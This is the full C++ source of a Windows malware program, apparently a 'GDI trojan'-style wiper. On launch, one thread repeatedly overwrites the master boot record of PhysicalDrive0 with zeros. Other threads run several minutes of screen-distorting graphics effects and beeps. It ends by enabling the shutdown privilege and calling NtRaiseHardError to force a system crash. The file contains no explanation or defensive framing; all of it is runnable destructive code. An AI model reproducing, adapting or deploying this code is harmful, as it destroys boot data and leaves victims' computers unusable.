#include <Windows.h>
#include <iostream>
#define _USE_MATH_DEFINES 1
#include <cmath>
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

using namespace std;

DWORD MBR() {
	while (1) {
		char mbrData[512];
		ZeroMemory(&mbrData, (sizeof mbrData));
		HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		DWORD write;
		WriteFile(MBR, mbrData, 512, &write, NULL);
		CloseHandle(MBR);
	}
}

DWORD Rotate() {
	HDC desk = GetDC(0);
	POINT wPt[3];
	RECT wRect;
	while (true)
	{
		desk = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 50;
		wPt[0].y = wRect.top - 10;
		wPt[1].x = wRect.right + 30;
		wPt[1].y = wRect.top + 10;
		wPt[2].x = wRect.left - 10;
		wPt[2].y = wRect.bottom - 10;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Train() {
	HDC desk = GetDC(0);
	int x = SM_CXSCREEN;
	int y = SM_CYSCREEN;
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		BitBlt(desk, -30, 0, w, h, desk, 0, 0, SRCCOPY);
		BitBlt(desk, w - 30, 0, w, h, desk, 0, 0, SRCCOPY);
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Tun() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		SetStretchBltMode(desk, HALFTONE);
		StretchBlt(desk, -10, -10, sw + 20, sh + 20, desk, 0, 0, sw, sh, SRCINVERT);
		StretchBlt(desk, 10, 10, sw - 20, sh - 20, desk, 0, 0, sw, sh, SRCINVERT);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Tun2() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		SetStretchBltMode(desk, HALFTONE);
		StretchBlt(desk, -10, -10, sw + 20, sh + 20, desk, 0, 0, sw, sh, 0x999999);
		StretchBlt(desk, 10, 10, sw - 20, sh - 20, desk, 0, 0, sw, sh, 0x999999);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Magic() {
	HWND upWnd = GetDesktopWindow();
	HDC upHdc = GetDC(upWnd);
	HDC desktop = GetDC(0);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(0);
		for (int i = 0; i < 1900; i++) {
			BitBlt(desktop, i, i, i, i, desktop, 100, 100, NOTSRCERASE);
			DeleteObject(&i);
		}
		ReleaseDC(upWnd, desktop);
		DeleteDC(desktop); DeleteObject(upWnd); DeleteObject(&xs); DeleteObject(&ys);
	}
}

DWORD Colors() {
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Sinewaves() {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			angle += M_PI / 40;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}

DWORD Sinewaves2() {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, 0x999999);
			BitBlt(desk, i, 0, 1, sh, desk, i, a, 0x999999);
			angle += M_PI / 40;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}

DWORD ColorHalf() {
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 128, rand() % 128, rand() % 128));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		DeleteObject(brush);
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD ScreenInvertGlitches() {
	HDC desk = GetDC(0);
	int X = GetSystemMetrics(SM_CXSCREEN);
	int Y = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		desk = GetDC(0);
		BitBlt(desk, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), desk, rand() % (X - 0), rand() % (Y - 0), NOTSRCCOPY);
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD LightTun() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		SetStretchBltMode(desk, HALFTONE);
		StretchBlt(desk, -10, -10, sw + 20, sh + 20, desk, 0, 0, sw, sh, SRCPAINT);
		StretchBlt(desk, 10, 10, sw - 20, sh - 20, desk, 0, 0, sw, sh, SRCPAINT);
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Invert() {
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

void Plg(int counter) {
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0, dY = 0, dW, dH;
	POINT wPt[3];

	hWnd = GetDesktopWindow();
	hWindow = GetWindowDC(hWnd);
	hDsktp = GetDC(0);
	GetWindowRect(hWnd, &wRect);

	dW = GetSystemMetrics(0);
	dH = GetSystemMetrics(1);

	wPt[0].x = wRect.left + counter;
	wPt[0].y = wRect.top - counter;
	wPt[1].x = wRect.right + counter;
	wPt[1].y = wRect.top + counter;
	wPt[2].x = wRect.left - counter;
	wPt[2].y = wRect.bottom - counter;
	PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
}

void Plg2(int counter) {
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0, dY = 0, dW, dH;
	POINT wPt[3];

	hWnd = GetDesktopWindow();
	hWindow = GetWindowDC(hWnd);
	hDsktp = GetDC(0);
	GetWindowRect(hWnd, &wRect);

	dW = GetSystemMetrics(0);
	dH = GetSystemMetrics(1);

	wPt[0].x = wRect.left - counter;
	wPt[0].y = wRect.top + counter;
	wPt[1].x = wRect.right - counter;
	wPt[1].y = wRect.top - counter;
	wPt[2].x = wRect.left + counter;
	wPt[2].y = wRect.bottom + counter;
	PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
}

DWORD PlgA() {
	while (true)
	{
		Plg(10);
		Plg2(10);
		Plg2(10);
		Plg(10);
	}
}

DWORD Colors2() {
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		DeleteObject(brush);
		Sleep(10);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD RandomSound() {
	while (true)
	{
		Beep(500, 1000);
		Beep(250, 1000);
		Beep(600, 1000);
		Beep(1250, 1000);
		Beep(1750, 1000);
		Beep(350, 1000);
		Beep(700, 1000);
		Beep(1000, 1000);
		Beep(1800, 1000);
		Beep(1100, 1000);
		Beep(2000, 1000);
		Beep(200, 1000);
		Beep(400, 1000);
		Beep(3000, 1000);
		Beep(100, 1000);
		Beep(1800, 1000);
		Beep(1600, 1000);
		Beep(2400, 1000);
		Beep(3200, 1000);
		Beep(2500, 1000);
		Beep(2250, 1000);
		Beep(2750, 1000);
		Beep(800, 1000);
		Beep(3500, 1000);
		Beep(3650, 1000);
		Beep(2800, 1000);
		Beep(4000, 1000);
		Beep(900, 1000);
		Beep(1650, 1000);
		Beep(3900, 1000);
		Beep(1375, 1000);
		Beep(3300, 1000);
		Beep(2300, 1000);
		Beep(320, 1000);
		Beep(750, 1000);
		Beep(100, 1000);
		Beep(200, 1000);
		Beep(300, 1000);
		Beep(400, 1000);
		Beep(500, 1000);
		Beep(600, 1000);
		Beep(700, 1000);
		Beep(800, 1000);
		Beep(900, 1000);
		Beep(1000, 1000);
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	HANDLE MBRHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MBR, 0, 0, 0);
	HANDLE RandomSoundHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RandomSound, 0, 0, 0);
	HANDLE RotateHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Rotate, 0, 0, 0);
	HANDLE TrainHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Train, 0, 0, 0);
	Sleep(20000);
	TerminateThread(RotateHandle, 1);
	TerminateThread(TrainHandle, 1);
	InvalidateRect(0, 0, 0);
	HANDLE TunHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Tun, 0, 0, 0);
	Sleep(20000);
	TerminateThread(TunHandle, 1);
	InvalidateRect(0, 0, 0);
	HANDLE MagicHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Magic, 0, 0, 0);
	HANDLE ColorsHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Colors, 0, 0, 0);
	Sleep(20000);
	TerminateThread(MagicHandle, 1);
	InvalidateRect(0, 0, 0);
	HANDLE SinewavesHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Sinewaves, 0, 0, 0);
	Sleep(20000);
	TerminateThread(ColorsHandle, 1);
	TerminateThread(SinewavesHandle, 1);
	InvalidateRect(0, 0, 0);
	HANDLE Tun2Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Tun2, 0, 0, 0);
	Sleep(20000);
	TerminateThread(Tun2Handle, 1);
	InvalidateRect(0, 0, 0);
	HANDLE Sinewaves2Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Sinewaves2, 0, 0, 0);
	Sleep(20000);
	TerminateThread(Sinewaves2Handle, 1);
	InvalidateRect(0, 0, 0);
	HANDLE ColorHalfHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ColorHalf, 0, 0, 0);
	HANDLE ScreenInvertGlitchesHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ScreenInvertGlitches, 0, 0, 0);
	HANDLE LightTunHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)LightTun, 0, 0, 0);
	HANDLE InvertHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Invert, 0, 0, 0);
	HANDLE MagicHandle2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Magic, 0, 0, 0);
	Sleep(20000);
	TerminateThread(ColorHalfHandle, 1);
	TerminateThread(ScreenInvertGlitchesHandle, 1);
	TerminateThread(LightTunHandle, 1);
	TerminateThread(InvertHandle, 1);
	TerminateThread(MagicHandle2, 1);
	InvalidateRect(0, 0, 0);
	HANDLE PlgAHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PlgA, 0, 0, 0);
	HANDLE Colors2Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Colors2, 0, 0, 0);
	Sleep(20000);
	BOOLEAN b;
	unsigned long response;
	RtlAdjustPrivilege(19, true, false, &b);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	Sleep(-1);
}